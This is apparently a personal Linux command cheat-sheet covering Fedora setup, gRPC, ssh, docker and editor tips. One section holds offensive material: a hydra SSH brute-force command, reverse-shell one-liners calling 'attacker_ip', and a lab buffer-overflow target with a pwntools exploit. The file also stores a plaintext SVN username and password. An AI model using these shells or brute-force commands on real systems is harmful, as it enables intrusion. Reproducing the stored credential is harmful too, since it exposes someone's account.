#====== unrar & rar ======

sudo dnf install -y https://download1.rpmfusion.org/free/fedora/rpmfusion-free-release-34.noarch.rpm
sudo dnf install -y https://download1.rpmfusion.org/nonfree/fedora/rpmfusion-nonfree-release-34.noarch.rpm
sudo dnf install -y unrar

#====== 无线网卡驱动安装 ======
unzip ../tools/Qualcomm-Atheros-QCA9377-Wifi-Linux-master.zip
# see *.doc

#====== 获取外网的ip地址 ======
curl ipecho.net/plain
curl -s http://myip.ipip.net

#====== 端口扫描 ======
#扫描tcp指定端口
alias nctcp='nc -vz -w10'
#扫描udp指定端口
alias ncudp='nc -vzu -w10'
#用法
#nctcp ip port
#ncudp ip port

#====== svn 免密登陆 ======
- K num: key的长度
- V num: value的长度

```sh
K 15
svn:realmstring
V 65
<svn://192.168.199.199:3690> a76b6178-e184-4093-9dc7-128c5e359fa8
K 8
username
V 10
lengyangyu
K 8
passtype
V 6
simple
K 8
password
V 16
Nex7Z0aAZXlrpwJg
END

~/.subversion/auth/svn.simple/a3d387b9f7ce46307d61960657c118d8
```

#====== dnf 加速下载
```
/etc/dnf/dnf.conf
[main]
proxy=http://127.0.0.1:7890
```

#====== weather reporter
```
curl wttr.in
```

#======= tranlate software
```
yum install goldendict
whereis goldendict
#config directory
~/.goldendict
#goldendict is hard link
```

#====== lockfile
```
#加密
lockfile a.c b.c
#解密
lockfile a.c.bfe
```

#====== nodejs
curl -sL https://rpm.nodesource.com/setup_12.x | sudo bash -
yum clean all
yum makecache
yum install -y nodejs

#====== fonts
```sh
https://github.com/ryanoasis/nerd-fonts/releases/download/v2.1.0/DroidSansMono.zip
mkdir ~/.local/share/fonts
auto-extract DroidSansMono.zip
mv ~/Downloads/Droid\ Sans\ Mono\ Nerd\ Font\ Complete* ~/.local/share/fonts
rm -fr DroidSansMono.zip
```

#====== supervisorctl supervisord
```sh
# control process group
#offical site
http://supervisord.org/
```


#====== grpc_cli
```sh
#show service
grpc_cli ls localhost:50051
#show service details
grpc_cli ls localhost:50051 helloworld.Greeter -l
#show methods
grpc_cli ls localhost:50051 helloworld.Greeter.SayHello -l
#show message type
grpc_cli type localhost:50051 helloworld.HelloRequest
#call a remote method
grpc_cli call localhost:50051 SayHello "name: 'gRPC CLI'"
```

#-----------------------------------------------secure way
#====== password cracking
```sh
# -l username
# -P password dict
# -t thread
hydra -l root -P /root/pass.txt -t 16 192.168.110.7 ssh
```

#====== bounce shell
```sh
#-------------------bash,python,perl
#attacker
### open port 12345 and listening
nc -lvvp 12345

#target
#-------------------bash
bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1
###or
nc -e /bin/bash attacker_ip attacker_port
#-------------------python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",attacker_port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
#-------------------perl
perl -e 'use Socket;$i="attacker_ip";$p=attacker_port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
#-------------------php
php -r '$sock=fsockopen("attacker_ip",attacker_port);exec("/bin/bash -i <&3 >&3 2>&3");'
```

#====== buffer overflow
##target *.cpp
```sh
#include<stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#define SERVER_PORT 12345
void backdooorr() {
system("/bin/sh -c whoami > /tmp/evil.txt");
}
int main() {
  char buf[8];
  int serverSocket;
  struct sockaddr_in server_addr;
  struct sockaddr_in clientAddr;
  int addr_len = sizeof(clientAddr);
  int client;
  char buffer[200];
  int iDataNum;
  serverSocket = socket(AF_INET, SOCK_STREAM, 0);
  bzero(&server_addr, sizeof(server_addr));
  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(SERVER_PORT);
  server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
  if (bind(serverSocket, (struct sockaddr *)&server_addr, sizeof(server_addr))<0){
      return -1;
  }
  listen(serverSocket, 5);
  while (1) {
    client = accept(serverSocket, (struct sockaddr *)&clientAddr,
                    (socklen_t *)&addr_len);
    printf("%d\n",ntohs(clientAddr.sin_port));
    read(client, buf, 0x30);
    break;
  }
  return 0;
}
```
## attacker
```sh
# get pwn way
apt-get update
apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools

# *.py
from pwn import *
cn=remote('192.168.120.192',12345) # 靶机部署的地址
cn.sendline(p64(0)*3+p64(0x4011b6))
cn.interactive()
```

#===== change default editor =====
```sh
vim ~/.zshrc
export EDITOR=nvim
source ~/.zshrc
```

#===== tty =====
```sh
# into tty3 tty4 tty5 tty6
ctrl-alt-[f3|f4|f5|f6]
# recover
ctrl-alt-[f1|f2]
```

#===== write read-only file ====
#using !!
w!!
wa!!

#===== docker account =====
vim ~/.docker/config.json
{
	"auths": {
		"ip[:port]": {
			"auth": "base64加密"
		}
	}
}

#===== linux namespace/cgroup =====
cd /sys/fs/cgroup
cd /proc/57780/ns

#===== systemctl auto-start =====
vim /usr/lib/systemd/system/clash.service
systemctl enable clash.service

#===== recover kitty keyboard =====
kitty +kitten ssh root@192.168.120.192

#===== curl ignore cert =====
curl -k

#===== cert证书制作 =====
https://github.com/yeasy/docker_practice/blob/master/repository/registry_auth.md

#===== node control k8s =====
scp master:~/.kube/config.yaml ~/.kube

#===== screen vedio record =====
gsettings set org.gnome.settings-daemon.plugins.media-keys max-screencast-length 0
alt-ctrl-shift-r

#===== change default shell =====
chsh -s /bin/zsh

#===== get language(locale) =====
locale
localectl status

#===== get dynamic lib =====
pkg-config <tab> --libs

#===== open anything by using default browser =====
xdg-open <url>

#===== glibc error != =====
# 解决办法
LD_PRELOAD="/lib64/libc-2.18.so" ln -s /lib64/libc-2.18.so /lib64/libc.so.6

#==== pkg official site ====
https://pkgs.org/

#==== ssh debug ====
# git use ssh
export GIT_SSH_COMMAND="ssh -vvv"

#==== ssh recover ssh-rsa =====
~/.ssh/config
Host *
    PubkeyAcceptedKeyTypes=+ssh-rsa

#===== private git repo ====
<project>/.git/config
[remote "origin"]
	url = ssh://git@gitlab.moresec-abc.com:10022/root/dockerdemo.git
	fetch = +refs/heads/*:refs/remotes/origin/*

#===== docker limit ====
podman pull <imagename>

#===== tencent meeting ====
alien -r TencentMeeting_0300000000_2.8.0.1_x86_64.publish.deb #将deb->rpm
rpm2cpio wemeet-2.8.0.1-2.x86_64.rpm |cpio -ivmd #get rpm content
vim /etc/gdm/custom.conf #add
WaylandEnable=false
DefaultSession=gnome-xorg.desktop

#===== kitty ibus chinese input error =====
GLFW_IM_MODULE=ibus kitty

#===== kitty fonts config =====
~/.local/share/fonts/
fc-cache -fv
kitty +list-fonts

#===== recover nvim copy paste question =====
sudo dnf install -y xclip

#===== get fedora version =====
rpm -E %fedora

#===== rpm alternative ======
rpm -qa | grep '*'
rpm -qa *.rpm

#===== cmake project jump in lsp ======
#in main directory cmakelist.txt
set(CMAKE_EXPORT_COMPILE_COMMANDS ON)
set(CMAKE_INSTALL_PREFIX_INITIALIZED_TO_DEFAULT ON)
# set(CMAKE_INSTALL_PREFIX ${CMAKE_BINARY_DIR}/install)
#build
mkdir build && cd build
cmake ..
cd ..
#then make a soft link to build/compile_commands.json
ln -s build/compile_commands.json compile_commands.json
#check port
netstat -ano | grep 9002
#config command completion, mv config file to follow site
/usr/share/zsh/site-functions
# R list directory and subdirectories file
ls **/*.sh
# lsb_release
lsb_release -si
# add user to docker group
sudo usermod -aG docker $USER && newgrp docker
# docker proxy setting
TODO
# watch image
ffplay -pixel_format nv12 -f rawvideo  -video_size 500x376  -i  500x376.nv12

#======== ssh config ==========
# ~/.ssh/config
Host 231
    HostName 10.23.4.231
    User garrick
    Port 31415
# usage
ssh 231

#======== grpc .h .cc ========
protoc --proto_path=/opt/vastai/vastpipe/vastpipe/include/mediapipe/framework/formats/:. --grpc_out=./build/ --plugin=protoc-gen-grpc=`which grpc_cpp_plugin` common/protocol/messenger.proto
## ph.h ph.cc
protoc --proto_path=/opt/vastai/vastpipe/vastpipe/include/mediapipe/framework/formats/:. --cpp_out=./build/ common/protocol/messenger.proto
